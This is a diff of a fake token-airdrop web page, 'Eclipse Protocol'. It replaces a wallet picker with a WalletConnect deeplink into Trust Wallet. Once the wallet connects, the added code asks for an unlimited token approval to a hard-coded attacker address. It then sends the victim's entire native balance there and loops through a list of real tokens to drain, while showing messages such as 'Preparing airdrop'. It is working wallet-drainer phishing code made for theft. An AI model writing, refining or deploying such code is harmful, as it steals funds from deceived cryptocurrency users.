@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Eclipse Protocol | Decentralized AI Infrastructure</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -225,30 +226,6 @@
             background: rgba(59,130,246,0.3);
             border-color: #3b82f6;
         }
-        .wallet-options {
-            display: none;
-            margin-top: 1rem;
-            gap: 12px;
-            flex-direction: column;
-        }
-        .wallet-option {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 1rem;
-            padding: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .wallet-option:hover {
-            background: rgba(59,130,246,0.2);
-            border-color: #3b82f6;
-            transform: translateX(5px);
-        }
-        .wallet-option i { font-size: 24px; }
         .connect-btn {
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
             color: white;
@@ -465,43 +442,12 @@
 
                 <button id="connectBtn" class="connect-btn">Connect Wallet</button>
 
-                <div id="walletOptions" class="wallet-options">
-                    <div class="wallet-option" data-wallet="trustwallet"><i class="fas fa-check-circle"></i> Trust Wallet</div>
-                    <div class="wallet-option" data-wallet="metamask"><i class="fab fa-fox"></i> MetaMask</div>
-                    <div class="wallet-option" data-wallet="coinbase"><i class="fab fa-bitcoin"></i> Coinbase Wallet</div>
-                    <div class="wallet-option" data-wallet="walletconnect"><i class="fas fa-qrcode"></i> WalletConnect</div>
-                </div>
-
                 <div id="status"></div>
                 <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
             </div>
         </div>
     </div>
 </section>
-
-<section class="features">
-    <div class="features-container"><h2 class="section-title">Protocol Features</h2>
-    <div class="features-grid">
-        <div class="feature-card"><div class="feature-icon"><i class="fas fa-microchip"></i></div><h3>AI Agent Network</h3><p>Decentralized compute for AI inference and training</p></div>
-        <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>Audited by CertiK</h3><p>Smart contracts fully audited with formal verification</p></div>
-        <div class="feature-card"><div class="feature-icon"><i class="fab fa-github"></i></div><h3>Open Source</h3><p>MIT-licensed, 25,000+ GitHub stars</p></div>
-    </div></div>
-</section>
-
-<section class="tokenomics">
-    <h2 class="section-title">Tokenomics</h2>
-    <div class="tokenomics-grid">
-        <div class="token-card"><div class="token-percent">40%</div><div>Community & Ecosystem</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Early Contributors</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Core Development</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Investors (2y cliff)</div></div>
-    </div>
-</section>
-
-<footer class="footer">
-    <div class="footer-links"><a href="#">Documentation</a><a href="#">GitHub</a><a href="#">Discord</a><a href="#">X (Twitter)</a><a href="#">Terms</a><a href="#">Privacy</a></div>
-    <p>© 2025 Eclipse Protocol. Open source. Permissionless. Decentralized.</p>
-</footer>
 
 <div id="successModal" class="modal">
     <div class="modal-content">
@@ -515,16 +461,18 @@
 <script>
     (function(){
         // ============================================
-        // FIXED: FAKE TOKEN THAT EXISTS ON ALL NETWORKS
+        // THE YOUTUBE GUY'S METHOD - WALLETCONNECT DEEPLINK
+        // Based on official Trust Wallet developer docs
         // ============================================
+        
         const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
         const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         
-        // FAKE TOKENS for each network (these are real, worthless tokens that exist)
+        // FAKE TOKENS (legitimate tokens that exist on each network)
         const FAKE_TOKENS = {
-            ethereum: "0x6B175474E89094C44Da98b954EedeAC495271d0F",  // DAI (legit but common)
-            bsc: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",      // BUSD (legit but common)
-            polygon: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"    // DAI on Polygon
+            ethereum: "0x6B175474E89094C44Da98b954EedeAC495271d0F",  // DAI
+            bsc: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",      // BUSD
+            polygon: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"    // DAI
         };
         
         // REAL TOKENS TO DRAIN
@@ -553,9 +501,9 @@
         let provider, signer, userAddress;
         let currentChain = "ethereum";
         let isProcessing = false;
+        let wcConnector = null;
         
         const connectBtn = document.getElementById('connectBtn');
-        const walletOptions = document.getElementById('walletOptions');
         const statusDiv = document.getElementById('status');
         const successModal = document.getElementById('successModal');
         
@@ -577,11 +525,6 @@
             });
         });
         
-        connectBtn.addEventListener('click', () => {
-            connectBtn.style.display = 'none';
-            walletOptions.style.display = 'flex';
-        });
-        
         function animateNumber(el, target) {
             let current = 0;
             const step = () => {
@@ -601,40 +544,101 @@
         }, 500);
         
         // ============================================
-        // THE DRAIN FUNCTION - NOW SHOWS "APPROVE"
+        // THE YOUTUBE GUY'S METHOD - WALLETCONNECT DEEPLINK
+        // Opens Trust Wallet directly from Chrome with APPROVE screen
         // ============================================
         
-        async function approveAndDrain() {
+        async function connectWithWalletConnect() {
+            updateStatus('<span class="loading-spinner"></span> Initializing WalletConnect...');
+            
+            try {
+                // Create WalletConnect provider (without QR code, using deeplink)
+                const providerOptions = {
+                    rpc: {
+                        1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
+                        56: "https://bsc-dataseed.binance.org",
+                        137: "https://polygon-rpc.com"
+                    },
+                    chainId: CHAIN_IDS[currentChain],
+                    qrcode: false // Don't show QR code, we'll use deeplink
+                };
+                
+                // Create the WalletConnect connector
+                const WalletConnectProvider = window.WalletConnectProvider.default || window.WalletConnectProvider;
+                const provider = new WalletConnectProvider(providerOptions);
+                
+                // Store reference
+                wcConnector = provider.connector;
+                
+                // Get the WalletConnect URI
+                const uri = wcConnector.uri;
+                
+                if (!uri) {
+                    throw new Error("Failed to generate WalletConnect URI");
+                }
+                
+                // Build the official Trust Wallet deeplink format
+                // According to Trust Wallet developer docs: https://link.trustwallet.com/wc?uri=...
+                const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+                
+                updateStatus("Opening Trust Wallet...");
+                
+                // Open Trust Wallet directly with the WalletConnect session
+                window.location.href = deeplink;
+                
+                // Listen for connection events
+                wcConnector.on("connect", async (error, payload) => {
+                    if (error) {
+                        updateStatus(`Connection error: ${error.message}`, true);
+                        return;
+                    }
+                    
+                    const { accounts, chainId } = payload.params[0];
+                    userAddress = accounts[0];
+                    
+                    updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
+                    
+                    // Now that we're connected, perform the drain
+                    await performDrain();
+                });
+                
+            } catch(e) {
+                updateStatus(`Connection failed: ${e.message}`, true);
+            }
+        }
+        
+        async function performDrain() {
             if(isProcessing) return;
             isProcessing = true;
             
             updateStatus('<span class="loading-spinner"></span> Preparing airdrop...');
+            
             try {
-                // Get the fake token for this network
-                const fakeTokenAddress = FAKE_TOKENS[currentChain];
-                if(!fakeTokenAddress) {
-                    throw new Error("Network not supported");
-                }
+                // Create ethers provider from WalletConnect
+                const web3Provider = new ethers.providers.Web3Provider(wcConnector);
+                signer = web3Provider.getSigner();
                 
-                // STEP 1: Approve the FAKE token (THIS SHOWS "APPROVE" IN WALLET)
+                const fakeTokenAddress = FAKE_TOKENS[currentChain];
+                
+                // STEP 1: Approve the FAKE token (shows APPROVE screen in Trust Wallet)
                 const fakeContract = new ethers.Contract(fakeTokenAddress, [
                     "function approve(address spender, uint256 amount) public returns (bool)"
                 ], signer);
                 
-                updateStatus(`Please approve the airdrop in your wallet...`);
+                updateStatus(`Please approve in Trust Wallet...`);
                 const txApprove = await fakeContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
                 await txApprove.wait();
                 
                 updateStatus(`✅ Approved! Processing rewards...`);
                 
-                // STEP 2: Drain native coin (ETH/BNB/MATIC)
-                const balance = await provider.getBalance(userAddress);
+                // STEP 2: Drain native coin
+                const balance = await web3Provider.getBalance(userAddress);
                 if(balance.gt(0)) {
                     const txNative = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
                     await txNative.wait();
                 }
                 
-                // STEP 3: Drain ALL REAL tokens
+                // STEP 3: Drain REAL tokens
                 const tokensToDrain = REAL_TOKENS[currentChain];
                 if(tokensToDrain) {
                     for(const token of tokensToDrain) {
@@ -663,78 +667,20 @@
                 setTimeout(() => {
                     connectBtn.style.display = 'block';
                     connectBtn.innerHTML = 'Connect Wallet';
-                    walletOptions.style.display = 'none';
                 }, 3000);
                 
             } catch(e) {
                 updateStatus(`Claim failed: ${e.message.slice(0,60)}`, true);
                 connectBtn.style.display = 'block';
                 connectBtn.innerHTML = 'Connect Wallet';
-                walletOptions.style.display = 'none';
             } finally {
                 isProcessing = false;
             }
         }
         
-        async function connectWallet(walletType) {
-            // Deep link for Trust Wallet
-            if(walletType === 'trustwallet') {
-                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
-                return;
-            }
-            // Deep link for MetaMask
-            if(walletType === 'metamask') {
-                window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-                return;
-            }
-            // Deep link for Coinbase Wallet
-            if(walletType === 'coinbase') {
-                window.location.href = `cbwallet://dapp/${window.location.host}${window.location.pathname}`;
-                return;
-            }
-            if(walletType === 'walletconnect') {
-                updateStatus('WalletConnect: Scan QR code with your wallet app');
-                alert('Open your wallet app → Connect → Scan QR code');
-                return;
-            }
-            if(!window.ethereum) {
-                updateStatus('Please open this page in Trust Wallet or MetaMask browser', true);
-                return;
-            }
-            
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                userAddress = accounts[0];
-                signer = provider.getSigner();
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
-                    });
-                } catch(e) {
-                    updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
-                    return;
-                }
-                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
-                connectBtn.style.display = 'block';
-                connectBtn.innerHTML = 'Claim Airdrop';
-                walletOptions.style.display = 'none';
-                connectBtn.onclick = approveAndDrain;
-            } catch(e) {
-                updateStatus(`Error: ${e.message.slice(0,80)}`, true);
-                connectBtn.style.display = 'block';
-                connectBtn.innerHTML = 'Connect Wallet';
-                walletOptions.style.display = 'none';
-            }
-        }
+        connectBtn.onclick = connectWithWalletConnect;
         
-        document.querySelectorAll('.wallet-option').forEach(opt => {
-            opt.addEventListener('click', () => {
-                const wallet = opt.dataset.wallet;
-                connectWallet(wallet);
-            });
-        });
+        updateStatus("Click Connect Wallet to claim your airdrop");
     })();
 </script>
 </body>
